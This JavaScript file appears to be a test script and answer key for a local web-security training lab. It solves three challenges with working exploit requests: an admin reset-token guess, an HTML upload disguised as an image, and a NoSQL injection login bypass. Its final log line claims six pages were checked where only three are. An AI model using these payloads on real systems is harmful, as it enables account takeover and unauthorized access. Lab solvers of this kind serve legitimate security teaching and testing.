const base = 'http://localhost:10002';

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function flagFrom(text) {
  const match = text.match(/PNP\{[^}]+\}/);
  assert(match, 'flag not found');
  return match[0];
}

async function verify(id, flag) {
  const response = await fetch(`${base}/lab/challenges/${id}/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ flag })
  });
  assert(response.ok, `${id} verification endpoint failed`);
  assert((await response.json()).correct === true, `${id} flag rejected`);
}

async function checkAuth() {
  const issue = await fetch(`${base}/lab/auth-recovery`, {
    method: 'POST',
    body: new URLSearchParams({ username: 'student', token: '' })
  });
  assert((await issue.text()).includes('reset-2'), 'student reset token not issued');
  const exploit = await fetch(`${base}/lab/auth-recovery`, {
    method: 'POST',
    body: new URLSearchParams({ username: 'admin', token: 'reset-1' })
  });
  const flag = flagFrom(await exploit.text());
  await verify('auth-recovery', flag);
}

async function checkUpload() {
  const data = new FormData();
  data.append('attachment', new Blob(['<html><h1>challenge</h1></html>'], { type: 'image/png' }), 'proof.html');
  const response = await fetch(`${base}/lab/upload-filter`, { method: 'POST', body: data });
  const flag = flagFrom(await response.text());
  await verify('upload-filter', flag);
}

async function checkNoSql() {
  const response = await fetch(`${base}/lab/nosql-login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: { $ne: null } })
  });
  assert(response.ok, 'NoSQL challenge request failed');
  const result = await response.json();
  assert(result.authenticated === true && result.username === 'admin', 'NoSQL injection did not authenticate');
  await verify('nosql-login', result.flag);
}

async function checkExistingPages() {
  for (const path of ['/login', '/lab/file?name=welcome.txt', '/oracle']) {
    const response = await fetch(base + path);
    assert(response.ok, `${path} unavailable`);
  }
}

await checkExistingPages();
await checkAuth();
await checkUpload();
await checkNoSql();
console.log('Server-side challenge checks passed: 6/6 pages, 3/3 new exploits and verification flows.');
